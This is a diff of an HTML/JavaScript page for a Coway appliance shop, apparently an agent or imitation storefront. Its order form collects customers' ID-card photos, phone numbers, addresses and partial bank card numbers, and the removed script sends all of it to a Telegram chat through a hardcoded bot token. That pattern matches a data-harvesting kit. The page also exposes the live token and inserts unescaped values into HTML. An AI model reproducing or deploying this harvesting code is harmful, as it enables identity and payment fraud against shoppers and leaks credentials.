-            const productsArray = JSON.parse(saved);
-            productsData = { all: productsArray, water: [], air: [], ac: [], washer: [], toilet: [], massageChair: [], massageBed: [], bed: [] };
-            productsArray.forEach(p => { if (productsData[p.category]) productsData[p.category].push(p); });
-        } else {
-            const defaultProducts = [
-                { id: 1, name: "Coway Omba", category: "water", desc_zh: "淨水與冰水一體，現代廚房首選。", desc_en: "Integrated water purifier with cold water.", price: "RM 3,999", images: ["https://placehold.co/800x400/80abce/white?text=Omba"] },
-                { id: 2, name: "Coway Neon", category: "water", desc_zh: "時尚設計，過濾重金屬。", desc_en: "Stylish design, removes heavy metals.", price: "RM 2,899", images: ["https://placehold.co/800x400/80abce/white?text=Neon"] },
-                { id: 3, name: "Coway Storm", category: "air", desc_zh: "強力淨化PM2.5與過敏原。", desc_en: "Powerful purification for PM2.5.", price: "RM 2,499", images: ["https://placehold.co/800x400/80abce/white?text=Storm"] },
-                { id: 4, name: "Coway Arctic", category: "ac", desc_zh: "節能冷氣，快速製冷。", desc_en: "Energy-saving AC, fast cooling.", price: "RM 2,199", images: ["https://placehold.co/800x400/80abce/white?text=Arctic"] },
-                { id: 5, name: "Coway Relax Pro", category: "massageChair", desc_zh: "全身按摩，緩解疲勞。", desc_en: "Full body massage, relieve fatigue.", price: "RM 8,999", images: ["https://placehold.co/800x400/80abce/white?text=RelaxPro"] }
-            ];
-            productsData.all = defaultProducts;
-            defaultProducts.forEach(p => { if (productsData[p.category]) productsData[p.category].push(p); });
-            localStorage.setItem('coway_products', JSON.stringify(defaultProducts));
-        }
-    }
-
-    // ========== 加载轮播 ==========
-    function loadCarousel() {
-        let saved = localStorage.getItem('coway_carousel');
-        if (saved) carouselData = JSON.parse(saved);
-        else {
-            carouselData = [
-                { id: 1, image: "https://www.coway.com.my/files/Banner/coway-air-purifier-for-every-space.jpg", title: "纯净空气，健康生活", desc: "Coway 空气净化器", link: "list.html" },
-                { id: 2, image: "https://www.coway.com.my/files/Banner/coway-water-purifier-banner.jpg", title: "健康饮水，从Coway开始", desc: "净水器系列", link: "list.html" },
-                { id: 3, image: "https://www.coway.com.my/img/home/coway-virtual-showroom-tour.jpg", title: "Coway 虚拟展厅", desc: "360° 体验", link: "list.html" }
-            ];
-            localStorage.setItem('coway_carousel', JSON.stringify(carouselData));
-        }
-        renderCarousel();
-    }
-
-    function renderCarousel() {
-        const container = document.getElementById('carouselSlides');
-        const dotsContainer = document.getElementById('carouselDots');
-        if (!container || carouselData.length === 0) return;
-        container.innerHTML = '';
-        carouselData.forEach((item, idx) => {
-            const slide = document.createElement('div');
-            slide.className = `carousel-slide ${idx === currentCarouselSlide ? 'active' : ''}`;
-            slide.style.backgroundImage = `url(${item.image})`;
-            slide.innerHTML = `<div class="carousel-content"><h2>${escapeHtml(item.title)}</h2><p>${escapeHtml(item.desc)}</p><a href="${item.link || '#'}">了解更多 →</a></div>`;
-            container.appendChild(slide);
-        });
-        dotsContainer.innerHTML = '';
-        carouselData.forEach((_, idx) => {
-            const dot = document.createElement('div');
-            dot.className = `carousel-dot ${idx === currentCarouselSlide ? 'active' : ''}`;
-            dot.onclick = () => { goToCarouselSlide(idx); resetCarouselAutoPlay(); };
-            dotsContainer.appendChild(dot);
-        });
-        if (carouselInterval) clearInterval(carouselInterval);
-        carouselInterval = setInterval(() => { nextCarouselSlide(); }, 5000);
-    }
-
-    function updateCarouselDisplay() {
-        const slides = document.querySelectorAll('.carousel-slide');
-        const dots = document.querySelectorAll('.carousel-dot');
-        slides.forEach((s, i) => s.classList.toggle('active', i === currentCarouselSlide));
-        dots.forEach((d, i) => d.classList.toggle('active', i === currentCarouselSlide));
-    }
-
-    function nextCarouselSlide() {
-        if (carouselData.length === 0) return;
-        currentCarouselSlide = (currentCarouselSlide + 1) % carouselData.length;
-        updateCarouselDisplay();
-    }
-
-    function prevCarouselSlide() {
-        if (carouselData.length === 0) return;
-        currentCarouselSlide = (currentCarouselSlide - 1 + carouselData.length) % carouselData.length;
-        updateCarouselDisplay();
-    }
-
-    function goToCarouselSlide(idx) { currentCarouselSlide = idx; updateCarouselDisplay(); }
-    function resetCarouselAutoPlay() { if (carouselInterval) clearInterval(carouselInterval); carouselInterval = setInterval(() => { nextCarouselSlide(); }, 5000); }
-
-    // ========== 渲染分类 ==========
-    function renderCategoryList() {
-        const container = document.getElementById('categoryList');
-        container.innerHTML = '';
-        categories.forEach(cat => {
-            const li = document.createElement('li');
-            li.className = `category-item ${currentCategory === cat.id ? 'active' : ''}`;
-            li.innerHTML = `<i>${cat.icon}</i>${cat.name}`;
-            li.onclick = () => {
-                currentCategory = cat.id;
-                renderCategoryList();
-                renderProducts();
-                const catData = categories.find(c => c.id === cat.id);
-                document.getElementById('currentCategory').innerHTML = `<i>${catData.icon}</i>${catData.name}`;
-            };
-            container.appendChild(li);
-        });
-    }
-
-    // ========== 渲染产品 ==========
-    function renderProducts() {
-        const grid = document.getElementById('productsGrid');
-        if (!grid) return;
-        grid.innerHTML = '';
-        const list = productsData[currentCategory] || [];
-        if (list.length === 0) {
-            grid.innerHTML = '<div style="grid-column:1/-1; text-align:center; padding:60px; background:#fff; border-radius:20px; color:#999;"><i style="font-size:48px;">📦</i><p style="margin-top:15px;">暂无产品</p></div>';
-            return;
-        }
-        list.forEach(p => {
-            const card = document.createElement('div');
-            card.className = 'product-card';
-            const firstImage = p.images && p.images[0] ? p.images[0] : 'https://placehold.co/800x400/80abce/white?text=Product';
-            card.innerHTML = `
-                <img src="${firstImage}" alt="${p.name}">
-                <div class="info">
-                    <h4>${escapeHtml(p.name)}</h4>
-                    <p>${escapeHtml(p.desc_zh.substring(0, 60))}...</p>
-                    <div class="price"><i>💰</i> ${p.price}</div>
+    <div id="orderModal" class="order-modal">
+        <div class="order-content">
+            <span class="modal-close" onclick="closeOrderModal()">&times;</span>
+            <h3><i>📝</i> 填写订单信息</h3>
+            <div class="selected-product-info" id="selectedProductInfo"></div>
+            <p style="background:#e8f5e9; padding:14px; border-radius:12px; margin-bottom:25px; color:#27ae60;">
+                <i>✅</i> 感谢您的订购！请填写以下信息完成注册。
+            </p>
+            <form id="orderForm">
+                <div class="form-group"><label>📎 IC 照片 (正面) *</label><input type="file" id="icUpload" accept="image/*"></div>
+                <div class="form-row2">
+                    <div class="form-group"><label>📞 联系电话 #1 *</label><input type="tel" id="contact1" required></div>
+                    <div class="form-group"><label>📞 联系电话 #2</label><input type="tel" id="contact2"></div>
                 </div>
-            `;
-            card.onclick = () => openDetailModal(p);
-            grid.appendChild(card);
-        });
-    }
+                <div class="form-group"><label>🏠 安装地址 *</label><textarea id="address" rows="2" required></textarea></div>
+                <div class="checkbox-group"><input type="checkbox" id="differentDelivery"><label>📦 送货地址与安装地址不同</label></div>
+                <div class="form-group delivery-address" id="deliveryAddressGroup">
+                    <label>🚚 送货地址</label><textarea id="deliveryAddress" rows="2"></textarea>
+                </div>
+                <div class="form-group"><label>📧 电子邮箱 *</label><input type="email" id="email" required></div>
+                <div class="form-row2">
+                    <div class="form-group"><label>💳 银行卡 (前6位)</label><input type="text" id="cardFirst6" maxlength="6"></div>
+                    <div class="form-group"><label>💳 银行卡 (后4位)</label><input type="text" id="cardLast4" maxlength="4"></div>
+                </div>
+                <button type="submit" class="btn-submit">✅ 提交订单</button>
+            </form>
+        </div>
+    </div>
 
-    // ========== 详情弹窗 ==========
-    function openDetailModal(product) {
-        currentProduct = product;
-        document.getElementById('detailTitle').innerText = product.name;
-        document.getElementById('detailPrice').innerHTML = `<i>💰</i> ${product.price}`;
-        document.getElementById('detailDesc').innerText = product.desc_zh;
-        currentLang = 'zh';
-        
-        const carouselDiv = document.getElementById('detailCarousel');
-        carouselDiv.innerHTML = '';
-        const images = product.images && product.images.length ? product.images : ['https://placehold.co/800x400/80abce/white?text=Product'];
-        images.forEach(img => { carouselDiv.innerHTML += `<div><img src="${img}" alt=""></div>`; });
-        
-        if ($('#detailCarousel').hasClass('slick-initialized')) $('#detailCarousel').slick('unslick');
-        $('#detailCarousel').slick({ dots: true, infinite: true, speed: 300, slidesToShow: 1, adaptiveHeight: true, autoplay: true, autoplaySpeed: 3000 });
-        
-        document.getElementById('detailModal').classList.add('active');
-    }
+    <div id="successModal" class="success-modal">
+        <div class="success-content">
+            <div class="success-icon">✓</div>
+            <h3>订单提交成功！</h3>
+            <p>感谢您提交的详细信息。<br><br>我们将尽快处理您的订单，并将PDF文件发送给您签署。</p>
+            <button class="btn-ok" onclick="closeSuccessModal()">确定</button>
+        </div>
+    </div>
 
-    function closeDetailModal() {
-        document.getElementById('detailModal').classList.remove('active');
-        if ($('#detailCarousel').hasClass('slick-initialized')) $('#detailCarousel').slick('unslick');
-    }
-
-    document.getElementById('translateBtn')?.addEventListener('click', () => {
-        if (!currentProduct) return;
-        const el = document.getElementById('detailDesc');
-        if (currentLang === 'zh') { el.innerText = currentProduct.desc_en; currentLang = 'en'; }
-        else { el.innerText = currentProduct.desc_zh; currentLang = 'zh'; }
-    });
-
-    document.getElementById('orderFromDetailBtn')?.addEventListener('click', () => {
-        closeDetailModal();
-        document.getElementById('selectedProductInfo').innerHTML = `<span><strong>${currentProduct.name}</strong></span><span style="color:#80abce; font-weight:700;">${currentProduct.price}</span>`;
-        document.getElementById('orderModal').classList.add('active');
-    });
-
-    document.getElementById('contactFromDetailBtn')?.addEventListener('click', () => {
-        const agent = getLeastBusyAgent();
-        if (agent) {
-            window.open(`https://wa.me/${agent.contact}?text=${encodeURIComponent(`Hello ${agent.name}, I am interested in ${currentProduct?.name}.`)}`, '_blank');
-        } else {
-            alert('暂无可用的代理，请稍后再试。');
-        }
-    });
-
-    // ========== 订单表单 ==========
-    const differentCheckbox = document.getElementById('differentDelivery');
-    const deliveryGroup = document.getElementById('deliveryAddressGroup');
-    if (differentCheckbox) {
-        differentCheckbox.addEventListener('change', function() {
-            deliveryGroup.classList.toggle('show', this.checked);
-            if (!this.checked) document.getElementById('deliveryAddress').value = '';
-        });
-    }
-
-    function closeOrderModal() {
-        document.getElementById('orderModal').classList.remove('active');
-        document.getElementById('orderForm').reset();
-        if (differentCheckbox) differentCheckbox.checked = false;
-        deliveryGroup.classList.remove('show');
-    }
-
-    function closeSuccessModal() { document.getElementById('successModal').classList.remove('active'); }
-
-    // ========== 订单提交 ==========
-    document.getElementById('orderForm')?.addEventListener('submit', async (e) => {
-        e.preventDefault();
-        if (!currentProduct) { alert("请先选择产品"); return; }
-        if (!document.getElementById('contact1').value) { alert("请填写联系电话"); return; }
-        if (!document.getElementById('address').value) { alert("请填写安装地址"); return; }
-        if (!document.getElementById('email').value) { alert("请填写电子邮箱"); return; }
-        
-        const formatPhone = (phone) => {
-            let cleaned = phone.replace(/\D/g, '');
-            if (cleaned.startsWith('0')) cleaned = '60' + cleaned.substring(1);
-            if (!cleaned.startsWith('60')) cleaned = '60' + cleaned;
-            return cleaned;
-        };
-        
-        const productName = currentProduct.name;
-        const contact1 = formatPhone(document.getElementById('contact1').value);
-        const contact2 = document.getElementById('contact2').value ? formatPhone(document.getElementById('contact2').value) : '';
-        const address = document.getElementById('address').value;
-        const cardFirst6 = document.getElementById('cardFirst6').value || '';
-        const cardLast4 = document.getElementById('cardLast4').value || '';
-        const deliveryAddr = differentCheckbox?.checked ? document.getElementById('deliveryAddress').value : '';
-        const orderId = 'COW' + Date.now();
-        const agent = getLeastBusyAgent();
-        
-        if (!agent) { alert('暂无可用的代理'); return; }
-        
-        const submitBtn = e.target.querySelector('.btn-submit');
-        const originalText = submitBtn.innerText;
-        submitBtn.innerText = '⏳ 处理中...';
-        submitBtn.disabled = true;
-        
-        try {
-            // Telegram 通知
-            const BOT_TOKEN = '8386407941:AAF0W9XaG1tZNdwovITL2wrM-7L3uwQJfso';
-            const CHAT_ID = '-1003696449169';
-            let tgMessage = `🧾 *新订单*\\n\\n*产品:* ${productName}\\n*电话1:* ${contact1}\\n${contact2 ? `*电话2:* ${contact2}\\n` : ''}*地址:* ${address}\\n${deliveryAddr ? `*送货地址:* ${deliveryAddr}\\n` : ''}${cardFirst6 || cardLast4 ? `*银行卡:* ${cardFirst6}xxxxxx${cardLast4}\\n` : ''}*代理:* ${agent.hp_code}\\n*订单号:* ${orderId}`;
-            
-            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-                method: 'POST', headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ chat_id: CHAT_ID, text: tgMessage, parse_mode: 'Markdown' })
-            });
-            
-            const icFile = document.getElementById('icUpload').files[0];
-            if (icFile) {
-                const formData = new FormData();
-                formData.append('chat_id', CHAT_ID);
-                formData.append('photo', icFile);
-                formData.append('caption', `📎 IC 照片 - 订单 ${orderId}`);
-                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: 'POST', body: formData });
-            }
-            
-            let orders = JSON.parse(localStorage.getItem('coway_orders') || '[]');
-            orders.unshift({ orderId, date: new Date().toISOString(), product: productName, contact1, contact2, address, deliveryAddress: deliveryAddr, cardFirst6, cardLast4, assignedAgent: agent.name, agentCode: agent.hp_code, status: 'pending' });
-            localStorage.setItem('coway_orders', JSON.stringify(orders));
-            incrementAgentReceipt(agent);
-            
-            closeOrderModal();
-            document.getElementById('successModal').classList.add('active');
-        } catch (error) {
-            console.error('提交失败:', error);
-            alert('提交失败，请重试');
-        } finally {
-            submitBtn.innerText = originalText;
-            submitBtn.disabled = false;
-        }
-    });
-
-    function escapeHtml(str) {
-        if (!str) return '';
-        return str.replace(/[&<>]/g, m => ({ '&': '&amp;', '<': '&lt;', '>': '&gt;' })[m]);
-    }
-
-    // ========== 移动端菜单 ==========
-    document.getElementById('menuBtn')?.addEventListener('click', () => {
-        document.getElementById('sidebar').classList.add('open');
-        document.getElementById('overlay').classList.add('show');
-    });
-    document.getElementById('overlay')?.addEventListener('click', () => {
-        document.getElementById('sidebar').classList.remove('open');
-        document.getElementById('overlay').classList.remove('show');
-    });
-    document.getElementById('carouselPrev')?.addEventListener('click', () => { prevCarouselSlide(); resetCarouselAutoPlay(); });
-    document.getElementById('carouselNext')?.addEventListener('click', () => { nextCarouselSlide(); resetCarouselAutoPlay(); });
-
-    // ========== 初始化 ==========
-    loadProducts();
-    loadCarousel();
-    loadAgents();
-    renderCategoryList();
-    renderProducts();
-</script>
-
+    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
+    <script src="https://cdn.jsdelivr.net/npm/slick-carousel@1.8.1/slick/slick.min.js"></script>
+    <script src="js/layout.js"></script>
+    <script src="js/list.js"></script>
 </body>
 </html>
